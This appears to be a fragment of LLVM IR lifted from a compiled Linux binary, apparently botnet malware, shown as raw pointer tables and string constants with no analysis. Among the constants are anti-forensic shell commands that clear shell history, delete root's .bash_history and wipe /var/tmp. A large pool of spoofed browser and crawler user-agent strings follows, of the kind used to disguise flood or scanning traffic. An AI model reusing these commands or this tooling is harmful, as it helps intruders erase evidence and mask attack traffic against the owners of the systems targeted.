@global_var_2d024.506 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a9d0.423, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a9d8.424, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a9e0.425, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a9e4.426, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a9e8.427, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a9f0.428, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a9f4.429, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a9f4.429, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a9fc.430, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aa04.431, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aa0c.432, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa14.433, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa18.434, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa1c.435, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa20.436, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa24.437, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa28.438, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa2c.439, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa30.440, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1aa34.441, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1aa38.442, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aa4c.443, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1aa58.444, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aa64.445, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aa6c.446, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aa74.447, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aa80.448, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aa8c.449, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aa94.450, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1aaa0.451, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1aaac.452, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1aab8.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a9d0.423, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a9d8.424, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aac4.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aacc.455, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aad4.456, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aae0.457, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aaec.458, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aaf4.459, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aafc.460, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ab08.461, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab10.42, i32 0, i32 0), i8* bitcast (i32* @global_var_1ab14.462 to i8*), i8* bitcast (i32* @global_var_1ab18.463 to i8*), i8* bitcast (i32* @global_var_1ab1c.464 to i8*), i8* bitcast (i32* @global_var_1ab20.465 to i8*), i8* bitcast (i32* @global_var_1ab24.466 to i8*), i8* bitcast (i32* @global_var_1ab28.467 to i8*), i8* bitcast (i32* @global_var_1ab2c.468 to i8*), i8* bitcast (i32* @global_var_1ab30.469 to i8*), i8* bitcast (i32* @global_var_1ab34.470 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab38.471, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab3c.472, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab40.473, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab44.474, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab48.475, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab4c.476, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab50.477, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab54.478, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab58.479, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab5c.480, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ab60.481, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ab64.482, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ab6c.483, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ab74.484, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ab7c.485, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ab84.486, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ab8c.487, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ab94.488, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ab9c.489, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aba4.490, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1abac.491, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1abb8.492, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1abc0.493, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1abc8.494, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1abd4.495, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1abdc.496, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1abe4.497, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1abec.498, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1abf4.499, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1abfc.500, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ac04.501, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ac0c.502, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ac18.503, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ac20.504, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1ac28.505, i32 0, i32 0)]
@global_var_1bcd4.512 = constant i32 34
@global_var_d100.513 = constant i32 436207626
@global_var_1bcd8.515 = constant [16 x i8] c"AAAAAAAAnetcore\00"
@global_var_1bcec.517 = constant [3 x i8] c"AA\00"
@global_var_1bd8c.519 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1bda4.521 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_1bdc4.523 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1be04.525 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1be44.526 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1be84.527 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1bf14.528 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1bf4c.529 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1bf6c.530 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1bf84.531 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1bfdc.532 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_1c07c.533 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_1c0d0.534 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_1c144.535 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_1c184.536 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_1c23c.537 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_1c290.538 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_1c2e8.539 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_1c340.540 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_1c380.541 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_1c3c8.542 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_1c420.543 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_1c48c.544 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_1c4e4.545 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_1c534.546 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_1c558.547 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_1c5b4.548 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_1c5c4.549 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_1c5f4.550 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_1c618.551 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_1c63c.552 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_1c658.553 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1c698.554 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_1c6e8.555 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1c734.556 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_1c770.557 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_1c7cc.558 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_1c834.559 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_1c8a8.560 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_1c920.561 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_1c97c.562 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_1c9d0.563 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_1ca58.564 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1caac.565 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_1cb14.566 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_1cb70.567 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_1cbc0.568 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_1cc04.569 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_1cc58.570 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_1cca4.571 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1cce8.572 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_1cd3c.573 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_1cda8.574 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_1ce18.575 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_1ce74.576 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_1cee8.577 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_1cf58.578 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_1cff0.579 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_1d03c.580 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_1d0a4.581 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_1d0e0.582 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_1d110.583 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_1d150.584 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00"
@global_var_1d19c.585 = constant [83 x i8] c"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_1d1f0.586 = constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00"
@global_var_1d2a0.587 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_1d308.588 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_1d370.589 = constant [80 x i8] c"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/\00"
@global_var_1d3c0.590 = constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00"
@global_var_1d3f8.591 = constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00"
@global_var_1d428.592 = constant [91 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1d484.593 = constant [105 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1d4f0.594 = constant [102 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1d558.595 = constant [87 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1d5b0.596 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1d60c.597 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1d668.598 = constant [86 x i8] c"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )\00"
@global_var_1d6c0.599 = constant [93 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)\00"
@global_var_1d720.600 = constant [97 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)\00"
@global_var_1d784.601 = constant [43 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)\00"
@global_var_1d7b0.602 = constant [52 x i8] c"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)\00"
@global_var_1d7e4.603 = constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00"
@global_var_1d804.604 = constant [31 x i8] c"TheSuBot/0.1 (www.thesubot.de)\00"
@global_var_1d824.605 = constant [85 x i8] c"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_1d87c.606 = constant [94 x i8] c"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_1d8dc.607 = constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_1d934.608 = constant [94 x i8] c"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_1d994.609 = constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_1d9ec.610 = constant [31 x i8] c"FAST-WebCrawler/3.x Multimedia\00"
@global_var_1da0c.611 = constant [37 x i8] c"Mozilla/4.0 (compatible: FDSE robot)\00"
@global_var_1da34.612 = constant [63 x i8] c"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1da74.613 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1dabc.614 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1db04.615 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1db4c.616 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1db94.617 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_1dbe8.618 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_1dc38.619 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_1dca4.620 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_1dcf8.621 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_1dd54.622 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_1ddb0.623 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_1de14.624 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_1de70.625 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1decc.626 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1df28.627 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1df88.628 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_1dfd0.629 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_1e068.630 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_1e0b4.631 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1e100.632 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_1e150.633 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_1e198.634 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_1e1ec.635 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_1e23c.636 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_1e284.637 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_1e2d0.638 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1e31c.639 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_1e364.640 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1e3b4.641 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1e404.642 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1e438.643 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1e46c.644 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_1e4b4.645 = constant [54 x i8] c"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)\00"
@global_var_1e4ec.646 = constant [77 x i8] c"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0\00"
@global_var_1e53c.647 = constant [68 x i8] c"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)\00"
@global_var_1e580.648 = constant [47 x i8] c"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\00"
@global_var_1e5b0.649 = constant [47 x i8] c"msnbot/0.9 (+http://search.msn.com/msnbot.htm)\00"
@global_var_1e5e0.650 = constant [48 x i8] c"msnbot/0.11 ( http://search.msn.com/msnbot.htm)\00"
@global_var_1e610.651 = constant [46 x i8] c"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)\00"
@global_var_1e640.652 = constant [71 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)\00"
@global_var_1e688.653 = constant [70 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)\00"
@global_var_1e6d0.654 = constant [55 x i8] c"NetResearchServer/4.0(loopimprovements.com/robot.html)\00"
@global_var_1e708.655 = constant [55 x i8] c"NetResearchServer/3.5(loopimprovements.com/robot.html)\00"
@global_var_1e740.656 = constant [55 x i8] c"NetResearchServer/2.8(loopimprovements.com/robot.html)\00"
@global_var_1e778.657 = constant [55 x i8] c"NetResearchServer/2.7(loopimprovements.com/robot.html)\00"
@global_var_1e7b0.658 = constant [55 x i8] c"NetResearchServer/2.5(loopimprovements.com/robot.html)\00"
@global_var_1e7e8.659 = constant [83 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)\00"
@global_var_1e83c.660 = constant [55 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\00"
@global_var_1e874.661 = constant [84 x i8] c"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\00"
